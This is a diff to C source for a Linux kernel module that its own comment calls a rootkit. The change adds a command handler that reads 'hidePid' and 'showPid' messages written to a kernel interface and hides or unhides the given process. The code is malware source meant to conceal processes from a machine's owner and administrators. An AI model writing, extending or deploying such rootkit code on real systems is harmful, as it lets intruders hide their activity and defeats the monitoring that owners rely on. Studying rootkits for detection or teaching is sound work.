@@ -10,6 +10,8 @@
 #include "hideProcEntry.h"
 #include "common.h"
 
+static void handleCommand(char *input);
+
 //TODO: ensure its possible to communicate with the rootkit without being root
 
 
@@ -80,16 +82,20 @@ static ssize_t receiveWrite(struct file *file, const char *userBuffer, size_t le
 	kernelBuffer[len] = '\0';
 
 	printInfo("%s", kernelBuffer);
-   
-	//
-	//int pidToHide = atoi(kernelBuffer);
-	int pidToHide;
-	sscanf(kernelBuffer, "%d", &pidToHide);
 
-
-	hideProcess(pidToHide);
-
+	handleCommand(kernelBuffer);
 
 	return len;
 }
 
+
+
+static void handleCommand(char *input) {
+	int arg;
+
+	if (sscanf(input, "hidePid %d", &arg) == 1) {
+		hideProcess(arg);
+	} else if (sscanf(input, "showPid %d", &arg) == 1) {
+		showProcess(arg);
+	}
+}
